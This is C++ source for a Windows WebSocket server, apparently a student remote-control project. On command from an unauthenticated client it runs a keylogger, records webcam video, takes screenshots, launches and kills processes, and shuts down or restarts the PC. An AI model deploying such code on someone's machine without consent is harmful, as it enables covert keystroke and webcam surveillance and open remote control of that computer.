// --- CAU HINH WINDOWS ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/strand.hpp>
#include <cstdlib>      
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <fstream>
#include <windows.h>   
#include <iphlpapi.h>

// Cac module chuc nang
#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"
#include "Application.h"
#include "ScreenShot.h"

// Link thu vien Windows
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "iphlpapi.lib")

// [MOI] Khai bao ham de lay do phan giai man hinh that (tranh bi Windows Scale)
extern "C" __declspec(dllimport) BOOL __stdcall SetProcessDPIAware();

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;

// =============================================================
// PHAN 1: CAC HAM HO TRO (HELPER FUNCTIONS)
// =============================================================

// 1. Ma hoa Base64 (De gui file video/anh qua socket)
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;

    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

// 2. Lay Ten May Tinh (Hostname)
std::string GetComputerNameStr() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown-PC";
}

// 3. Lay Ten He Dieu Hanh (Doc Registry de phan biet Win 10/11)
std::string GetOSVersionStr() {
    std::string osName = "Unknown Windows";
    HKEY hKey;

    // Mo Registry chua thong tin Windows
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[255] = { 0 };
        DWORD dataSize = sizeof(productName);

        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
            osName = std::string(productName);
        }

        char currentBuild[32] = { 0 };
        dataSize = sizeof(currentBuild);
        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)currentBuild, &dataSize) == ERROR_SUCCESS) {
            int buildNumber = std::atoi(currentBuild);
            if (buildNumber >= 22000) {
                size_t pos = osName.find("Windows 10");
                if (pos != std::string::npos) {
                    osName.replace(pos, 10, "Windows 11");
                }
            }
        }
        RegCloseKey(hKey);
    }
    return osName;
}

// 4. Lay Do Phan Giai Man Hinh (Thuc te)
std::string GetScreenResolution() {
    // Lay Virtual Screen de bao quat tat ca man hinh neu co
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    // Fallback neu khong lay duoc
    if (width == 0) width = GetSystemMetrics(SM_CXSCREEN);
    if (height == 0) height = GetSystemMetrics(SM_CYSCREEN);

    return std::to_string(width) + "x" + std::to_string(height);
}

// 5. Lay Dung Luong Pin
std::string GetBatteryStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryLifePercent == 255) return "Plugged In"; // May ban hoac khong co pin
        return std::to_string(sps.BatteryLifePercent) + "%";
    }
    return "Unknown";
}

// 6. Lay Nhiet Do CPU (Goi PowerShell qua WMI)
std::string GetRealCPUTemp() {
    std::string tempStr = "N/A";
    // Lenh PowerShell lay nhiet do (Don vi Kelvin x 10)
    std::string cmd = "powershell -command \"Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace 'root/wmi' | Select -ExpandProperty CurrentTemperature\"";

    // Chay lenh ngam
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);

    if (!pipe) return "Err";

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    // Xu ly ket qua (Kelvin -> Celsius)
    try {
        if (!result.empty()) {
            double kelvin = std::stod(result);
            double celsius = (kelvin - 2732) / 10.0;
            if (celsius > 0 && celsius < 150) // Loc gia tri ao
                return std::to_string((int)celsius) + "C";
        }
    }
    catch (...) {}

    return "N/A";
}

// 7. Lay IP
void PrintLocalIPs() {
    ULONG outBufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);

    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == NO_ERROR) {
        PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            if (pCurrAddresses->OperStatus == IfOperStatusUp && pCurrAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
                if (pUnicast) {
                    char ip[INET_ADDRSTRLEN];
                    sockaddr_in* sa_in = (sockaddr_in*)pUnicast->Address.lpSockaddr;
                    inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);

                    // Chỉ in các IP mạng LAN (thường bắt đầu bằng 192.168... hoặc 10...)
                    std::string ipStr(ip);
                    if (ipStr.find("192.168.") == 0 || ipStr.find("10.") == 0 || ipStr.find("172.") == 0) {
                        std::cout << ">>> YOUR SERVER IP: " << ipStr << " <<<\n";
                    }
                }
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }
    free(pAddresses);
}

// Khai bao ham Shutdown/Restart 
void DoShutdown();
void DoRestart();

std::thread g_webcamThread;

// Ham bao loi
void fail(beast::error_code ec, char const* what) {
    std::cerr << what << ": " << ec.message() << "\n";
}

// =============================================================
// PHAN 2: XU LY KET NOI (SESSION)
// =============================================================

class session : public std::enable_shared_from_this<session>
{
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;

public:
    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}

    void run() {
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec) {
        if (ec) return fail(ec, "Accept Error");
        do_read();
    }

    void do_read() {
        ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
    }

    // --- TRUNG TAM XU LY LENH TU CLIENT ---
    void on_read(beast::error_code ec, std::size_t bytes_transferred)
    {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        if (ws_.got_text())
        {
            std::string command = beast::buffers_to_string(buffer_.data());
            std::cout << "RECEIVED COMMAND: " << command << "\n";

            static Keylogger myKeylogger;
            static Process myProcessModule;
            static Application myAppModule;

            // -------------------------------------------------
            // NHOM 1: SYSTEM INFO & POWER
            // -------------------------------------------------

            // Lay thong tin may (Hostname, OS, Resolution, Battery)
            if (command == "get-sys-info")
            {
                std::string hostname = GetComputerNameStr();
                std::string os = GetOSVersionStr();
                std::string resolution = GetScreenResolution();
                std::string battery = GetBatteryStatus();
                std::string cpuTemp = GetRealCPUTemp();

                // Format: Hostname | OS | Resolution | Battery
                std::string response = "sys-info " + hostname + "|" + os + "|" + resolution + "|" + battery;

                ws_.text(true);
                ws_.write(net::buffer(response));
                std::cout << "[SERVER] Sent Info: " << hostname << " | " << os << " | " << resolution << "\n";
            }

            // Xu ly Ping (Do do tre mang thuc te)
            else if (command == "ping")
            {
                ws_.text(true);
                ws_.write(net::buffer("pong"));
            }

            // Shutdown
            else if (command == "shutdown")
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, shutting down in 15s..."));
                DoShutdown();
            }
            // Restart
            else if (command == "restart")
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, restarting in 15s..."));
                DoRestart();
            }

            // -------------------------------------------------
            // NHOM 2: MEDIA (WEBCAM & SCREENSHOT)
            // -------------------------------------------------

            // Capture Webcam (10s)
            else if (command == "capture") {
                if (g_webcamThread.joinable()) {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Busy recording..."));
                }
                else {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Started recording..."));
                    auto self = shared_from_this();
                    g_webcamThread = std::thread([self]() {
                        std::vector<char> videoData = CaptureWebcam(10);
                        if (!videoData.empty()) {
                            std::string encoded = base64_encode(videoData);
                            try {
                                self->ws_.text(true);
                                self->ws_.write(net::buffer("file " + encoded));
                            }
                            catch (...) {}
                        }
                        });
                    g_webcamThread.detach();
                }
            }
            else if (command == "stop-capture") {
                StopWebcam();
                ws_.text(true);
                ws_.write(net::buffer("Server: Stopping webcam..."));
            }

            // Screenshot 
            else if (command == "screenshot")
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, capturing screenshot..."));

                // Kích thước màn hình – phải trùng với bên ScreenShot.cpp
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);

                // Gọi hàm ScreenShot() trong ScreenShot.cpp
                // Trả về buffer BGRA 32-bit: size = width * height * 4
                std::vector<std::uint8_t> pixels = ScreenShot();

                if (pixels.empty())
                {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Error capturing screenshot."));
                }
                else
                {
                    // Đổi sang vector<char> để dùng lại base64_encode(const std::vector<char>&)
                    std::vector<char> bytes(pixels.begin(), pixels.end());
                    std::string encoded = base64_encode(bytes);

                    // Gửi cho client:
                    //  screenshot <w> <h> <base64_raw_bgra>
                    std::string response =
                        "screenshot " +
                        std::to_string(width) + " " +
                        std::to_string(height) + " " +
                        encoded;

                    ws_.text(true);
                    ws_.write(net::buffer(response));

                    std::cout << "[SERVER] Screenshot (" << width << "x" << height
                        << ") sent to Client.\n";
                }
            }

            // -------------------------------------------------
            // NHOM 3: KEYLOGGER
            // -------------------------------------------------

            else if (command == "start-keylog")
            {
                myKeylogger.StartKeyLogging();
                ws_.text(true);
                ws_.write(net::buffer("Server: Keylogger started (background)..."));
            }
            else if (command == "stop-keylog")
            {
                myKeylogger.StopKeyLogging();
                ws_.text(true);
                ws_.write(net::buffer("Server: Keylogger stopped."));
            }
            else if (command == "get-keylog")
            {
                std::string logs = myKeylogger.GetLoggedKeys();
                if (logs.empty()) logs = "[No keys recorded]";
                ws_.text(true);
                ws_.write(net::buffer("KEYLOG_DATA:\n" + logs));
            }

            // -------------------------------------------------
            // NHOM 4: PROCESSES
            // -------------------------------------------------

            // List Process
            else if (command == "ps")
            {
                std::string list = myProcessModule.ListProcesses();
                ws_.text(true);
                ws_.write(net::buffer(list));
            }
            // Start Process
            else if (command.rfind("start ", 0) == 0)
            {
                std::string appName = command.substr(6);
                if (myProcessModule.StartProcess(appName)) {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Started successfully: " + appName));
                }
                else {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Error! Could not start: " + appName));
                }
            }
            // Kill Process
            else if (command.rfind("kill ", 0) == 0)
            {
                std::string target = command.substr(5);
                std::string result = myProcessModule.StopProcess(target);
                ws_.text(true);
                ws_.write(net::buffer("Server: " + result));
            }

            // -------------------------------------------------
            // NHOM 5: APPLICATIONS 
            // -------------------------------------------------

            // List Apps
            else if (command == "list-app")
            {
                // Cập nhật danh sách ứng dụng từ Registry
                myAppModule.LoadInstalledApplications();

                // Lấy danh sách kèm trạng thái đang chạy
                auto apps = myAppModule.ListApplicationsWithStatus();

                ws_.text(true);

                if (apps.empty())
                {
                    ws_.write(net::buffer("Server: Khong tim thay ung dung nao trong Registry."));
                }
                else
                {
                    std::string msg = "DANH SACH UNG DUNG DA CAI:\n";

                    // Nếu muốn giới hạn số lượng gửi, có thể dùng maxShow, còn không thì in hết
                    // size_t maxShow = std::min<std::size_t>(apps.size(), 50);
                    size_t maxShow = apps.size(); // in toàn bộ

                    for (size_t i = 0; i < maxShow; ++i)
                    {
                        const auto& appInfo = apps[i].first; // ApplicationInfo { name, path }
                        bool running = apps[i].second;

                        msg += "[" + std::to_string(i) + "] " + appInfo.name;
                        if (running) msg += " (RUNNING)";
                        msg += "\n";

                        msg += "    Exe: " + appInfo.path + "\n\n";
                    }

                    ws_.write(net::buffer(msg));
                }
            }

            // 6.2. Start Application
            // Lệnh: "start-app <ten app hoac exe/path>"
            // Ví dụ: start-app zoom, start-app chrome, start-app C:\...\Zalo.exe
            else if (command.rfind("start-app ", 0) == 0)
            {
                const std::string prefix = "start-app ";
                std::string input = command.substr(prefix.size()); // phần sau "start-app "

                // Application::StartApplication chỉ wrap sang Process::StartProcess,
                // nên không bắt buộc phải LoadInstalledApplications ở đây.
                bool ok = myAppModule.StartApplication(input);

                ws_.text(true);
                if (ok)
                {
                    ws_.write(net::buffer("Server: Da mo ung dung: " + input));
                }
                else
                {
                    ws_.write(net::buffer("Server: Khong the mo ung dung: " + input));
                }
            }

            // 6.3. Stop Application
            // Lệnh: "stop-app <ten exe hoac PID>"
            // Ví dụ: stop-app chrome, stop-app chrome.exe, stop-app 1234
            else if (command.rfind("stop-app ", 0) == 0)
            {
                const std::string prefix = "stop-app ";
                std::string input = command.substr(prefix.size()); // phần sau "stop-app "

                // StopApplication hiện tại wrap sang Process::StopProcess:
                // - nếu là số  -> dừng theo PID
                // - nếu là chữ -> dừng theo tên exe (chrome, chrome.exe, ...)

                bool ok = myAppModule.StopApplication(input);

                ws_.text(true);
                if (ok)
                {
                    ws_.write(net::buffer(
                        "Server: Da dung ung dung (hoac khong co process nao dang chay): " + input));
                }
                else
                {
                    ws_.write(net::buffer(
                        "Server: Loi khi dung ung dung / PID: " + input));
                }
            }
        }
        buffer_.consume(buffer_.size());
        do_read();
    }
};

// =============================================================
// PHAN 3: MAIN & LISTENER
// =============================================================

class listener : public std::enable_shared_from_this<listener>
{
    net::io_context& ioc_;
    tcp::acceptor acceptor_;

public:
    listener(net::io_context& ioc, tcp::endpoint endpoint)
        : ioc_(ioc), acceptor_(ioc)
    {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }

    void run() { do_accept(); }

private:
    void do_accept() {
        acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (ec) fail(ec, "Accept Error");
        else std::make_shared<session>(std::move(socket))->run();
        do_accept();
    }
};

int main()
{
    SetProcessDPIAware();

    // Lang nghe moi dia chi IP (0.0.0.0) de may khac trong LAN ket noi duoc
    auto const address = net::ip::make_address("0.0.0.0");
    auto const port = static_cast<unsigned short>(8080);
    int const threads = 1;

    std::cout << "Starting AuraLink Server...\n";
    PrintLocalIPs();
    std::cout << "Listening on ws://" << address.to_string() << ":" << port << "\n";
    std::cout << "----------------------------------\n";

    net::io_context ioc{ threads };
    std::make_shared<listener>(ioc, tcp::endpoint{ address, port })->run();
    ioc.run();

    return EXIT_SUCCESS;
}